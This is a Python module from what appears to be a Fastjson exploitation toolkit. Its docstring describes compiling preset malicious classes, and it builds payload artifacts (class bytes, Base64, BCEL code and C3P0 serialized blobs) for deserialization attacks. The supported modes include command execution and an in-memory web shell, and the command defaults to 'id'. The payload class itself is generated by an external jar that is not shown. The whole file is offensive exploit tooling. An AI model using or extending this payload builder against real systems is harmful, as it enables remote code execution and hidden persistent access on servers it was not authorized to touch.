"""编译预设恶意类 → .class / Base64 / BCEL / C3P0 序列化。

优先走 bytecode-gen.jar；保留 PresetArtifact 兼容旧调用。
"""

from __future__ import annotations

import base64
from dataclasses import dataclass
from typing import Literal, Optional

from fastjson_toolkit.poc.bytecode.resolve import (
    default_proof_content,
    default_proof_path,
    normalize_preset_choice,
    resolve_preset_mode,
)
from fastjson_toolkit.poc.bytecode.source import (
    DEFAULT_SER_CLASS,
    DEFAULT_STATIC_CLASS,
    PresetMode,
)

PresetChoice = Literal["auto", "off", "custom", "touch", "exec", "echo", "memshell"]


@dataclass(frozen=True)
class PresetArtifact:
    class_name: str
    class_bytes: bytes
    class_b64: str
    bcel_code: str
    mode: PresetMode
    cmd: str
    proof_path: Optional[str]
    source: str
    serialized_b64: Optional[str] = None


def build_preset_artifact(
    *,
    mode: PresetMode = "exec",
    cmd: str = "id",
    proof_path: Optional[str] = None,
    proof_content: Optional[str] = None,
    class_name: str = DEFAULT_STATIC_CLASS,
    for_c3p0: bool = False,
) -> PresetArtifact:
    """生成预设类（委托 bytecode-gen.jar）。for_c3p0=True 时额外产出 serialized_b64。"""
    from fastjson_toolkit.poc.bytecode.client import generate_touch_exec

    cn = class_name
    if for_c3p0 and (not cn or cn == DEFAULT_STATIC_CLASS):
        cn = DEFAULT_SER_CLASS
    result = generate_touch_exec(
        mode=mode,
        cmd=cmd or "id",
        proof_path=proof_path or "/tmp/fj_preset",
        proof_content=proof_content if proof_content is not None else "FJ_PRESET",
        class_name=cn,
        for_c3p0=for_c3p0,
    )
    class_b64 = result["classBytesBase64"]
    class_bytes = base64.b64decode(class_b64)
    return PresetArtifact(
        class_name=str(result.get("className") or cn),
        class_bytes=class_bytes,
        class_b64=class_b64,
        bcel_code=str(result.get("bcelCode") or ""),
        mode=mode,
        cmd=str(result.get("cmd") or cmd or "id"),
        proof_path=str(result.get("proofPath") or proof_path),
        source=str(result.get("source") or ""),
        serialized_b64=result.get("serializedBase64"),
    )


__all__ = [
    "PresetArtifact",
    "PresetChoice",
    "build_preset_artifact",
    "default_proof_content",
    "default_proof_path",
    "normalize_preset_choice",
    "resolve_preset_mode",
]
